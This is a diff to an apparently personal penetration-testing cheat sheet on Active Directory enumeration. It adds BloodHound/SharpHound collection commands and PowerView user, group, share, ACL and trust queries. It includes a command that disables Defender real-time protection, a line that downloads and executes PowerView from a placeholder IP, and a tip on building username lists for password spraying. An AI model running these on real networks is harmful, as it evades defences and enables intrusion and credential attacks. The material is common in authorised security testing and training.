@@ -11,8 +11,25 @@ permalink: /brainbox/
 
 
 ## DOMAIN ENUMERATION
+
+I do prefer to do manual enumeration but on large enterprice networks, some automated scan would come in handy to search for low hanging fruits
+
+Automated Scanners
+AdPeas.ps1
+
+You can aswell use BloodHound to visualize data
+
+```powershell
+#For SharpHound.exe
+./SharpHound.exe --CollectionMethod All
+
+#For SharpHound.ps1
+Invoke-BloodHound -ZipFileName ratloot -CollectionMethod All -Domain  rat.local
+
+```
 <span class="demo-highlight"># Patch AMSI or disable AV</span>
 
+Getting hands dirty with PowerView
 ```powershell
       Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
       iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_DeV.ps1')
@@ -26,35 +43,35 @@ permalink: /brainbox/
       Get-NetDomainController     
 ```
 <br>
- <span class="demo-highlight">#User Enumeration</span>
+ <span class="demo-highlight"># User Enumeration</span>
 
 ```powershell
-      # Get all users present in the domain
-      Get-NetUsers | select cn
+# Get all users present in the domain
+Get-NetUsers | select cn
 
-      # Get users sorted with most logoncounts
-      Get-UserProperty -Properties logoncount | where logoncount | sort logoncount -Descending
+# Get users sorted with most logoncounts
+Get-UserProperty -Properties logoncount | where logoncount | sort logoncount -Descending
 
-      # Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying
-      Get-NetUsers | select samaccountname > username.txt
+# Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying
+Get-NetUsers | select samaccountname > username.txt
 
 ```
 <br>
-<span class="demo-highlight">Group Enumeration </span>
+<span class="demo-highlight"># Group Enumeration </span>
 
 ```powershell
 # Get AD groups data either all or of a user
 Get-NetGroup [-Domain <target>] [-FullData] [-GroupName "*admin*"] [-Username 'user_name']
 
-#Get Members of a group
+# Get Members of a group
 Get-NetGroupMember [-GroupName 'group_name'] [-Recurse]	
 ```
 <br>
 <span class="demo-highlight"># Share Enumeration</span>
 
 ```powershell
-    # Find interesting shares
-    Invoke-ShareFinder -ExcludeStandard -ExcludeIPC -ExcludePrint	
+# Find interesting shares
+Invoke-ShareFinder -ExcludeStandard -ExcludeIPC -ExcludePrint	
 
 ```
 <br>
@@ -72,7 +89,7 @@ Get-NetGPOGroup
 <span class="demo-highlight"># OU Enumeration</span>
 
 ```powershell
-    # Get all OU (Organisational Units) in the domain
+# Get all OU (Organisational Units) in the domain
 Get-NetOU [-FullData]
 
 # Get gplink of an OU to get GPOs applied to it
@@ -88,7 +105,7 @@ Get-NetGPO -GPOName '{cadkfapsdfasdfaudvajkd}'
 <span class="demo-highlight"># ACL Enumeration</span>
 
 ```powershell
-    # Find interesting ACL
+# Find interesting ACL
 Invoke-ACLScanner -ResolveGUIDS	
 
 # Find interesting ACL owned by a certain user :rat:
@@ -98,7 +115,7 @@ Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match 'rat'}
 <span class="demo-highlight"># Trust Enumeration</span>
 
 ```powershell
-    # Map all domain trust
+# Map all domain trust
 Get-NetDomainTrust [-Domain <target>]
 
 # Get all the domain of a forest
